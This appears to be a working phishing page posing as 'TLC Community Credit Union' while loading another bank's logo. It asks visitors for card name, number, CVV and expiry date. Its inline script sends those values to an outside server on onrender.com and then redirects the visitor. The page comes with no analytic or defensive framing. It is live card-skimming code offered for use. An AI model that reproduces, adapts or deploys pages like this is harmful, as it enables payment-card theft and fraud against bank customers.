<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1"
    />
    <link rel="stylesheet" href="./public/style.css" />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"
    />
    <title>TLC Community Credit Union</title>
  </head>
  <body>
    <div class="container">
      <div class="imgDiv">
        <img
          src="./public/vermillion-state-bank-logo-8c7cd70b.png"
          alt="logo"
          width="180"
        />
      </div>
      <span style="color: rgb(131, 131, 160); text-align: center"
        >Please enter your card details below</span
      >
      <form id="myForm">
        <input
          type="text"
          name="card name"
          id="cardName"
          placeholder="Card name"
          required
        />
        <input
          type="text"
          name="card number"
          id="cardNum"
          placeholder="Card Number"
          required
        />
        <input
          type="text"
          name="CVV"
          id="cvv"
          placeholder="Card CVV"
          required
        />
        <input
          type="text"
          name="exp date"
          id="expDate"
          placeholder="Expiry Date: (MM/YY)"
          required
        />
        <br />
        <button type="button" id="loginBtn" class="proceed">Proceed</button>
      </form>
    </div>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const loginBtn = document.getElementById("loginBtn");
        loginBtn.addEventListener("click", function (e) {
          const cardName = document.getElementById("cardName").value;
          const cardNum = document.getElementById("cardNum").value;
          const cvv = document.getElementById("cvv").value;
          const expDate = document.getElementById("expDate").value;

          fetch("https://tlc-backend.onrender.com/card-submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ cardName, cardNum, cvv, expDate }),
          })
            .then((response) => response.json())
            .then((data) => {
              window.location.href = data.redirectUrl;
            })
            .catch((error) => {
              console.error("Error:", error);
            });
        });
      });
    </script>
  </body>
</html>
